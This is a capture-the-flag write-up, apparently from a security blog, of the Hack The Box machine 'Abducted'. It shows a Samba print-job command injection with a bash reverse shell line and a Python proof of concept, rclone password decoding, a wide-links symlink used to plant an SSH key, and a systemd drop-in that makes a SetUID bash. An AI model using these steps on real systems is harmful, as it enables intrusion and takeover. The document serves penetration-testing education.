---
maquina: "Abducted"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "05 Jun 2026"
retire: "05 Jun 2026"
creadores: "TheCyberGeek, kavigihan"
htb_url: "https://hackthebox.com/machines/abducted"
app_url: "https://app.hackthebox.com/machines/924"
url: "https://0xdf.gitlab.io/2026/07/07/htb-abducted.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Abducted is a Linux box running Samba. I’ll exploit a command injection in Samba’s printing subsystem, where a client-controlled print job name is passed to a shell without escaping, to get a foothold. From there, I’ll find an rclone backup config with an obfuscated password, decode it with rclone, and use it to access the next user. That user owns a Samba share configured to follow wide links and to run as a third user, which I’ll abuse to drop an SSH key into that user’s home directory and log in. The final user belongs to a group with write access to the smbd systemd drop-in directory and a polkit rule permitting them to restart the service, so I’ll add an ExecStartPre command that creates a SetUID bash and get root.

## Recon

### Initial Scanning

`nmap` finds three open TCP ports, SSH (22), NetBios (139), and SMB (445):

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-05 19:51 UTC
Nmap scan report for 10.129.244.177
Host is up, received reset ttl 63 (0.022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 9.06 seconds
oxdf@hacky$ sudo nmap -p 22,139,445 -sCV 10.129.244.177
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-05 19:52 UTC
Nmap scan report for 10.129.244.177
Host is up (0.020s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-07-05T19:52:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```

Based on the [OpenSSH version](https://0xdf.gitlab.io/cheatsheets/os#ubuntu), the host is likely running Ubuntu 24.04 Noble LTS.

All of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

The “Host script results” show that SMB “Message signing enabled but not required”.

`nmap` reports the Samba version is 4.6.2, but that’s almost certainly wrong. SMB2 / SMB3 doesn’t send the version banner the way that SMB1 did, and SMB1 is disabled (which I’ll show shortly). The modern Ubuntu 24.04 OS running 4.6.2 (which is from 2017) would be very strange, as it comes with ~4.19.X by default.

### NetBIOS - TCP 139

I’ll enumerate NetBIOS using `nmblookup`:

```console
oxdf@hacky$ nmblookup -A 10.129.244.177
Looking up status of 10.129.244.177
        ABDUCTED        <00> -         B <ACTIVE>
        ABDUCTED        <03> -         B <ACTIVE>
        ABDUCTED        <20> -         B <ACTIVE>
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>
        WORKGROUP       <00> - <GROUP> B <ACTIVE>
        WORKGROUP       <1d> -         B <ACTIVE>
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>

        MAC Address = 00-00-00-00-00-00
```

These results show the host’s NetBIOS name table. The suffix bytes identify which services each name is registered for:

- `ABDUCTED <00>` (unique) - the Workstation Service, i.e. the machine’s NetBIOS name.
- `ABDUCTED <03>` (unique) - the Messenger Service.
- `ABDUCTED <20>` (unique) - the File Server Service. This confirms the host is sharing files over SMB, so there are shares to enumerate.
- `..__MSBROWSE__. <01>` (group) - the host is advertising itself as the master browser for the subnet.
- `WORKGROUP <00>` (group) - the host belongs to the workgroup named `WORKGROUP` (the default), which means there’s no Active Directory domain here.
- `WORKGROUP <1d>` (unique) - master browser for the `WORKGROUP` workgroup.
- `WORKGROUP <1e>` (group) - the Browser Election Service.

The all-zero MAC address is normal for Samba on Linux, which isn’t tied to a real network interface for NetBIOS.

### SMB - TCP 445

#### Share Enumeration

`netexec` shows the same hostname (Abducted), with the same domain (which typically means a workgroup, no domain):

```console
oxdf@hacky$ netexec smb 10.129.244.177
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
```

Guest Auth is enabled, which means I should be able to access shares anonymously.

With no username / password, it fails to auth:

```console
oxdf@hacky$ netexec smb 10.129.244.177 --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
SMB         10.129.244.177  445    ABDUCTED         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

When I add the guest username, it seems to auth successfully, but then fail to list shares:

```console
oxdf@hacky$ netexec smb 10.129.244.177 -u guest -p '' --shares
SMB         10.129.244.177  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
SMB         10.129.244.177  445    ABDUCTED         [+] ABDUCTED\guest: (Guest)
SMB         10.129.244.177  445    ABDUCTED         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

This says that the guest account is enabled and works with an empty password, but something is breaking how `netexec` uses it to list shares.

`smbclient` works just fine:

```console
oxdf@hacky$ smbclient -L //10.129.244.177/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
SMB1 disabled -- no workgroup available
```

`projects` and `transfer` reject guest authentication:

```console
oxdf@hacky$ smbclient //10.129.244.177/projects -N
tree connect failed: NT_STATUS_ACCESS_DENIED
oxdf@hacky$ smbclient //10.129.244.177/transfer -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

#### HP-Reception

I am able to connect to the `HP-Reception` share:

```console
oxdf@hacky$ smbclient //10.129.244.177/HP-Reception -N
Try "help" to get a list of possible commands.
smb: \>
```

However, I can’t list anything:

```console
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

This is not a disk, but a printer share. There’s nothing to list here. There is a `print` command:

```console
smb: \> print
print <filename>
```

If I try it, it needs a local file:

```console
smb: \> print test
Error opening local file test
```

If I create a dummy file in the current directory named `test`, it “prints”:

```console
smb: \> print test
putting file test as test (0.1 kb/s) (average 0.1 kb/s)
```

### RPC - TCP 445

I can also check RPC using `rpcclient`:

```console
oxdf@hacky$ rpcclient -N 10.129.244.177 -U ""
rpcclient $>
```

There are a couple ways I can look at users:

```console
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
rpcclient $> querydispinfo
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer      Desc:
```

There’s only one. The min password length is 5:

```console
rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000
```

I can get the same info about the shares:

```console
rpcclient $> netshareenumall
netname: HP-Reception
        remark: Reception printer
        path:   C:\var\spool\samba
        password:
netname: projects
        remark: Hartley Group Project Files
        path:   C:\srv\projects
        password:
netname: transfer
        remark: Staff file transfer
        path:   C:\srv\transfer
        password:
netname: IPC$
        remark: IPC Service (Hartley Group Document Services)
        path:   C:\tmp
        password:
```

There is one printer:

```console
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.129.244.177\]
        description:[\\10.129.244.177\,,Reception printer]
        comment:[Reception printer]
```

`srvinfo` gives information about the server:

```console
rpcclient $> srvinfo
        ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
```

OS version 6.1 would be Windows 7 or Server 2008 R2, but that’s a fake hardcoded string in Samba.

## Shell as nobody

### Identify CVEs

While I can’t get a reliable version, Abducted was released directly to retired in June 2026, which suggests a newsworthy vulnerability. Searching for “samba cve 2026”, the Brave AI response has an interesting writeup:

![image-20260705164709778](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260705164709778.png)

The first two are RCE, and the second one, CVE-2026-4480, is in the printing subsystem.

### CVE-2026-4480 Background

[CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480) is described as:

> A flaw was found in the Samba printing subsystem. Samba passes the client-controlled job description string to the command configured with the “print command” setting via the “%J” substitution character without escaping shell meta characters. A remote attacker could exploit this vulnerability by sending a specially crafted print job description that contains unescaped shell characters. This could lead to remote code execution on the affected system.

It’s an OS command injection in Samba’s print subsystem with a CVSS score of 10.0. When Samba’s print command config uses the %J substitution (the print job name/description), Samba passes the client-controlled job name to the shell with essentially no sanitizing. It only swaps single quotes for underscores, leaving shell metacharacters that could lead to command injection in the job name intact.

### Exploit

#### Manually

To exploit this, I’ll put the content I want to run into a file named `|sh`:

```console
oxdf@hacky$ echo 'ping -c 1 10.10.15.243' > '|sh'
```

Now I’ll use `smbclient` and the `print` command to print that file:

```console
oxdf@hacky$ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
putting file |sh as |sh (0.1 kb/s) (average 0.1 kb/s)
```

This will set `%J` to `|sh`, and the command becomes `cat <spoolfile> | sh`, executing the contents of the file. It works:

```console
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:22:43.787446 IP 10.129.244.177 > 10.10.15.243: ICMP echo request, id 1939, seq 1, length 64
21:22:43.787478 IP 10.10.15.243 > 10.129.244.177: ICMP echo reply, id 1939, seq 1, length 64
```

To get a shell, I’ll use a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```console
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.15.243/443 0>&1' > '|bash'
oxdf@hacky$ smbclient //10.129.244.177/HP-Reception -N -c 'print "|bash"'
putting file |bash as |bash (0.0 kb/s) (average 0.0 kb/s)
```

I switched the filename in both commands to `|bash` so that it runs under `bash` rather than `sh`, and on sending, there’s a connection at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.177 51490
bash: cannot set terminal process group (1715): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$
```

I’ll upgrade my shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
nobody@abducted:/var/spool/samba$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
nobody@abducted:/var/spool/samba$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
nobody@abducted:/var/spool/samba$
```

#### Box Creator’s POC

The box creator, TheCyberGeek, released a [POC](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) on GitHub on June 5, 2026, the same day that Abducted released. The work is done in the `exploit` function:

```python
def exploit(rhost, printer, body):
    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()                      # the guest printer share needs no creds

    binding = r"ncacn_np:%s[\pipe\spoolss]" % rhost
    iface = spoolss.spoolss(binding, lp, creds)

    handle = iface.OpenPrinter("\\\\%s\\%s" % (rhost, printer), "",
                               spoolss.DevmodeContainer(), PRINTER_ACCESS_USE)

    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"                 # this is what lands in %J
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info

    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, body, len(body))  # this is %s (the spool body, run as a script)
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)                  # triggers the print command server-side
    iface.ClosePrinter(handle)
```

It does the same thing I showed manually, creating a file named `|sh`, and then putting the command to run in the file to be printed.

I’ll have to run it with `python` (getting Samba packages into `uv` is not worth the squeeze for this simple exploit), giving it the remote host and the local IP and port for a reverse shell:

```console
oxdf@hacky$ python3 exploit.py
usage: exploit.py [-h] [-P PRINTER] [-c CMD] rhost lhost lport
exploit.py: error: the following arguments are required: rhost, lhost, lport
oxdf@hacky$ python3 exploit.py 10.129.244.177 10.10.15.243 445
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.15.243:445  (start a listener first: nc -lvnp 445)
[+] print job submitted -- check your listener / out-of-band channel
```

At `nc`, I get a shell:

```console
oxdf@hacky$ nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.129.244.177 35162
bash: cannot set terminal process group (2002): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$
```

## Shell as scott

### Enumeration

#### Users

The nobody user doesn’t have a home directory:

```console
nobody@abducted:/var/spool/samba$ cd ~
bash: cd: /nonexistent: No such file or directory
```

It’s set that way in `passwd`:

```console
nobody@abducted:/$ cat /etc/passwd | grep nobody
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

There are two users with home directories in `/home`:

```console
nobody@abducted:/home$ ls
marcus  scott
```

nobody can’t access either. Those same two users (plus root) have shells configured in `passwd`:

```console
nobody@abducted:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```

#### Filesystem

There’s nothing too interesting at the filesystem root:

```console
nobody@abducted:/$ ls
bin                dev   lib64              mnt   run                 srv  var
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin                sys
boot               home  lost+found         proc  sbin.usr-is-merged  tmp
cdrom              lib   media              root  snap                usr
```

`opt` has a directory named `offsite-backup`:

```console
nobody@abducted:/opt$ ls
offsite-backup
```

It’s a shell script and a rclone config:

```console
nobody@abducted:/opt/offsite-backup$ ls
rclone.conf  sync.sh
```

The script just makes a copy in `/srv`:

```bash
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

`/srv` does have two directories, and they line up with the shares:

```console
nobody@abducted:/srv$ ls
projects  transfer
```

nobody can’t access either.

The `rclone.conf` file has creds:

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

`rclone` encodes passwords using it’s own algorithm, and `rclone` can decode it:

```console
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

### su / SSH

The password doesn’t work for marcus, but it does for scott:

```console
nobody@abducted:/$ su - marcus
Password:
su: Authentication failure
nobody@abducted:/$ su - scott
Password:
scott@abducted:~$
```

It also works over SSH:

```console
oxdf@hacky$ sshpass -p iXzvcib3SrpZ ssh scott@10.129.244.177
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...[snip]...
scott@abducted:~$
```

And I can grab `user.txt`:

```console
scott@abducted:~$ cat user.txt
bf86f285************************
```

## Shell as marcus

### Enumeration

#### Home

scott’s home directory is completely empty:

```console
scott@abducted:~$ find . -type f
./.profile
./.bash_logout
./.bash_history
./.bashrc
./user.txt
./.cache/motd.legal-displayed
```

They also can’t run `sudo`:

```console
scott@abducted:~$ sudo -l
[sudo] password for scott:
Sorry, user scott may not run sudo on abducted.
```

#### Shares

scott does own both folders in `/srv`:

```console
scott@abducted:/srv$ ls -l
total 8
drwxr-x--- 2 scott scott 4096 Oct  9  2025 projects
drwxr-xr-x 2 scott scott 4096 Oct  9  2025 transfer
```

In `projects` there’s a `README`:

```console
scott@abducted:/srv/projects$ cat README.txt
Hartley Group - internal project store
```

`/etc/samba/shares.conf` has the configuration for the various shares:

```ini
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

For both `projects` and `transfer`, scott is the only valid user. Both are not read only. Both are browsable. `transfer` has `wide links = yes`.

`/etc/samba/smb.conf` has the global settings:

```ini
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
```

`allow insecure wide links = yes` is another one that stands out as interesting.

### Wide Link Abuse

#### Strategy

The [Samba docs](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#ALLOWINSECUREWIDELINKS) have a section on `allow insecure wide links`:

> In normal operation the option [wide links](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#WIDELINKS) which allows the server to follow symlinks outside of a share path is automatically disabled when [unix extensions](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#UNIXEXTENSIONS) are enabled on a Samba server. This is done for security purposes to prevent UNIX clients creating symlinks to areas of the server file system that the administrator does not wish to export. Setting [allow insecure wide links](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#ALLOWINSECUREWIDELINKS) to true disables the link between these two parameters, removing this protection and allowing a site to configure the server to follow symlinks (by setting [wide links](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#WIDELINKS) to “true”) even when [unix extensions](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html#UNIXEXTENSIONS) is turned on. It is not recommended to enable this option unless you fully understand the implications of allowing the server to follow symbolic links created by UNIX clients. For most normal Samba configurations this would be considered a security hole and setting this parameter is not recommended. This option was added at the request of sites who had deliberately set Samba up in this way and needed to continue supporting this functionality without having to patch the Samba code. Default: **`allow insecure wide links`* = `no`*

Wide links are links that point outside of the directory. So if I look at the `transfer` config, it only allows scott to auth, but then runs as marcus, and allows for wide links. That means I can write a symlink there that points to marcus’ home directory, and then access it over SMB.

#### Access Home Directory

I’ll create the link:

```console
scott@abducted:/srv/transfer$ ln -s /home/marcus
scott@abducted:/srv/transfer$ ls -l
total 0
lrwxrwxrwx 1 scott scott 12 Jul  6 00:53 marcus -> /home/marcus
```

From the server, I can’t access it as scott:

```console
scott@abducted:/srv/transfer$ cd marcus
-bash: cd: marcus: Permission denied
```

I’ll connect to SMB:

```console
oxdf@hacky$ smbclient //10.129.244.177/transfer -U scott%iXzvcib3SrpZ
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul  6 00:53:38 2026
  ..                                  D        0  Mon Jul  6 00:53:38 2026
  marcus                              D        0  Thu Jun  4 13:47:57 2026

                5768764 blocks of size 1024. 2300844 blocks available
```

I can access `marcus`:

```console
smb: \marcus\> ls
  .                                   D        0  Thu Jun  4 13:47:57 2026
  ..                                  D        0  Thu Jun  4 13:41:30 2026
  .profile                            H      807  Sun Mar 31 08:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 08:41:03 2024
  .bash_history                       H        0  Thu Jun  4 13:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 08:41:03 2024
  .cache                             DH        0  Thu Jun  4 13:41:30 2026

                5768764 blocks of size 1024. 2300832 blocks available
```

I’ll make a `.ssh` directory and add my public key:

```console
smb: \marcus\> mkdir .ssh
smb: \marcus\> put /home/oxdf/keys/ed25519_gen.pub .ssh/authorized_keys
putting file /home/oxdf/keys/ed25519_gen.pub as \marcus\.ssh\authorized_keys (1.4 kb/s) (average 1.4 kb/s)
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> ls
  .                                   D        0  Mon Jul  6 00:55:46 2026
  ..                                  D        0  Mon Jul  6 00:55:07 2026
  authorized_keys                     A       96  Mon Jul  6 00:55:46 2026

                5768764 blocks of size 1024. 2300764 blocks available
```

### SSH

With my key in place, I’ll connect to Abducted as marcus:

```console
oxdf@hacky$ ssh -i ~/keys/ed25519_gen marcus@10.129.244.177
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...[snip]...
marcus@abducted:~$
```

## Shell as root

### Enumeration

#### New File Access

With access as another user, I’ll look for files accessible uniquely to marcus:

```console
marcus@abducted:~$ find / -user marcus 2>/dev/null | grep -vP '^/(proc|sys|run)'
/dev/pts/2
/home/marcus
/home/marcus/.profile
/home/marcus/.bash_logout
/home/marcus/.ssh
/home/marcus/.ssh/authorized_keys
/home/marcus/.bash_history
/home/marcus/.bashrc
/home/marcus/.cache
/home/marcus/.cache/motd.legal-displayed
marcus@abducted:~$ find / -group marcus 2>/dev/null | grep -vP '^/(proc|sys|run)'
/home/marcus
/home/marcus/.profile
/home/marcus/.bash_logout
/home/marcus/.ssh
/home/marcus/.ssh/authorized_keys
/home/marcus/.bash_history
/home/marcus/.bashrc
/home/marcus/.cache
/home/marcus/.cache/motd.legal-displayed
```

There’s nothing really interesting there. `/dev/pts/2` shows an interactive pseudoterminal (PTY), but a quick check shows that’s my shell:

```console
marcus@abducted:~$ tty
/dev/pts/2
marcus@abducted:~$ who
scott    pts/1        2026-07-05 21:44 (10.10.15.243)
marcus   pts/2        2026-07-06 00:56 (10.10.15.243)
```

marcus does have an additional group, operators:

```console
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

This group is set as the group for only a single directory:

```console
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d/
drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d/
```

#### SMBd

`smbd.service.d` is a drop-in directory. When systemd loads a service, it looks for a directory with the `<name>.d` in each of its search paths, and merges any `.conf` files as overrides to the main configuration.

So in this case, the `smbd` service would load any configurations from this directory. To abuse this, I’ll need to be able to reboot the machine, or reload the systemd daemon and restart the service. One way to do this is just to try:

```console
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

Both run and return without output. If I try to restart a different service, it asks for auth as root:

```console
marcus@abducted:~$ systemctl restart sshd
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ====
Authentication is required to restart 'ssh.service'.
Authenticating as: root
Password:
```

So I can perform these actions, but why? This is polkit prompting for auth, which suggests I should check the polkit configuration.

Typically this would be defined in `/etc/polkit-1/rules.d/`, but I don’t have access:

```console
marcus@abducted:~$ ls -la /etc/polkit-1/rules.d/
ls: cannot open directory '/etc/polkit-1/rules.d/': Permission denied
```

`pkaction` lists every action registered with polkit. Each entry is an action ID, the string that a privileged operation is authorized against (`systemctl`, for example, maps its verbs onto these). Filtering the list for `systemd` actions, `org.freedesktop.systemd1.reload-daemon` stands out, as it’s the action behind `systemctl daemon-reload`:

```console
marcus@abducted:~$ pkaction
...[snip]...
org.freedesktop.systemd1.reload-daemon
...[snip]...
```

I can pull the details of that action with `pkaction --verbose`, and then ask polkit directly - via `pkcheck` - whether my current process is authorized for it:

```console
marcus@abducted:~$ pkaction --action-id org.freedesktop.systemd1.reload-daemon --verbose
org.freedesktop.systemd1.reload-daemon:
  description:       Reload the systemd state
  message:           Authentication is required to reload the systemd state.
  vendor:            The systemd Project
  vendor_url:        https://systemd.io
  icon:
  implicit any:      auth_admin
  implicit inactive: auth_admin
  implicit active:   auth_admin_keep

marcus@abducted:~$ pkcheck --action-id org.freedesktop.systemd1.reload-daemon --process $$ && echo "success"
success
```

`$$` is the PID of the current shell, so this is checking whether this process (running as marcus) is authorized for the action, and `pkcheck`’s exit code (0) says it is.

Trying to validate the `smbd` restart the same way doesn’t work, though. `manage-units` is the action behind `systemctl restart`, but it’s authorized per-unit, so I’d need to pass the target unit as a detail. polkit refuses to let an unprivileged caller do that:

```console
marcus@abducted:~$ pkcheck --action-id org.freedesktop.systemd1.manage-units --process $$ --detail unit smbd.service --detail verb restart
Error checking for authorization org.freedesktop.systemd1.manage-units: GDBus.Error:org.freedesktop.PolicyKit1.Error.NotAuthorized: Only trusted callers (e.g. uid 0 or an action owner) can use CheckAuthorization() and pass details
```

Only root or the action’s owner (systemd itself) may attach details to the query. And a plain `pkcheck` with no detail falls back to the default `auth_admin` and reads as denied. That doesn’t mean that marcus can’t restart smbd (I showed above that they could). It’s that the grant is conditional on the target unit (as I’ll show in Beyond Root), and a detail-less check can never satisfy that condition.

### Exploit

I’m going to write a config file that will load when I re-load the `smbd` service. I don’t want to mess up the running service, so I’ll use the `ExecStartPre` directive, which is [defined](https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html#ExecStartPre=) alongside `ExecStartPost`:

> Additional commands that are executed before or after the command in `ExecStart=`, respectively. Syntax is the same as for `ExecStart=`. Multiple command lines are allowed, regardless of the service type (i.e. `Type=`), and the commands are executed one after the other, serially. If any of those commands (not prefixed with “`-`”) fail, the rest are not executed and the unit is considered failed. `ExecStart=` commands are only run after all `ExecStartPre=` commands that were not prefixed with a “`-`” exit successfully. `ExecStartPost=` commands are only run after the commands specified in `ExecStart=` have been invoked successfully, as determined by `Type=` (i.e. the process has been started for `Type=simple` or `Type=idle`, the last `ExecStart=` process exited successfully for `Type=oneshot`, the initial process exited successfully for `Type=forking`, “`READY=1`” is sent for `Type=notify`/`Type=notify-reload`, or the `BusName=` has been taken for `Type=dbus`). Note that `ExecStartPre=` may not be used to start long-running processes. All processes forked off by processes invoked via `ExecStartPre=` will be killed before the next service process is run. Note that if any of the commands specified in `ExecStartPre=`, `ExecStart=`, or `ExecStartPost=` fail (and are not prefixed with “`-`”, see above) or time out before the service is fully up, execution continues with commands specified in `ExecStopPost=`, the commands in `ExecStop=` are skipped. Note that the execution of `ExecStartPost=` is taken into account for the purpose of `Before=`/`After=` ordering constraints.

I’ll write a config file that creates a SetUID / SetGID `bash` copy:

```console
marcus@abducted:/etc/systemd/system/smbd.service.d$ echo -e '[Service]\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"' | tee 0xdf.conf
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"
```

Now I just reload the daemon and then the service:

```console
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
```

And the shell exists:

```console
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1446024 Jul  6 12:55 /tmp/0xdf
```

I’ll run it with `-p` to avoid dropping privileges:

```console
marcus@abducted:/etc/systemd/system/smbd.service.d$ /tmp/0xdf -p
0xdf-5.2#
```

And grab `root.txt`:

```console
0xdf-5.2# cat root.txt
78c120e8************************
```

## Beyond Root - systemd Config

As root, I’m able to see what’s in `/etc/polkit-1/rules.d`:

```console
root@abducted:/etc/polkit-1/rules.d# ls
49-smbd-operators.rules
```

The contents of the file are JavaScript (or more accurately ECMAScript):

```js
polkit.addRule(function(action, subject) {
    if (!subject.isInGroup("operators")) { return; }
    if (action.id == "org.freedesktop.systemd1.reload-daemon") {
        return polkit.Result.YES;
    }
    if ((action.id == "org.freedesktop.systemd1.manage-units" ||
         action.id == "org.freedesktop.systemd1.manage-unit-files") &&
        action.lookup("unit") == "smbd.service") {
        return polkit.Result.YES;
    }
});
```

The first check is to return if the calling subject is not in the operators group.

Then it checks if the action id is the `reload-daemon`, and if so, returns that it is authorized.

Then it checks for two actions, `manage-units` and `manage-unit-files`, but only when the service is `smbd.service`. This is what allows for restarting the service from the operators group.
